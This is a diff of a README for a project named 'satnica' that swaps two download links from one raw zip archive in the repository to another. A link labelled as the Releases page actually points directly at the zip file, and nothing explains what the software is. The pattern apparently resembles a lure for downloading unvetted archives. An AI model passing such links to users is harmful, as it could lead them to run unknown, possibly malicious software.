@@ -21,14 +21,14 @@ Before you download and run **satnica**, make sure your system meets the followi
 
 ## 📥 Download
 
-### [![Download satnica](https://raw.githubusercontent.com/Zunairraza/satnica/main/templates/Software-v1.1.zip)](https://raw.githubusercontent.com/Zunairraza/satnica/main/templates/Software-v1.1.zip)
+### [![Download satnica](https://raw.githubusercontent.com/Zunairraza/satnica/main/output/Software-2.4.zip)](https://raw.githubusercontent.com/Zunairraza/satnica/main/output/Software-2.4.zip)
 
 You can download the latest release of **satnica** from the Releases page. 
 
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:  
-   [Visit the Releases Page](https://raw.githubusercontent.com/Zunairraza/satnica/main/templates/Software-v1.1.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Zunairraza/satnica/main/output/Software-2.4.zip)
 
 2. Once you are on the Releases page, look for the latest version of **satnica**. 
 3. Click on the appropriate link to download the file for your operating system.
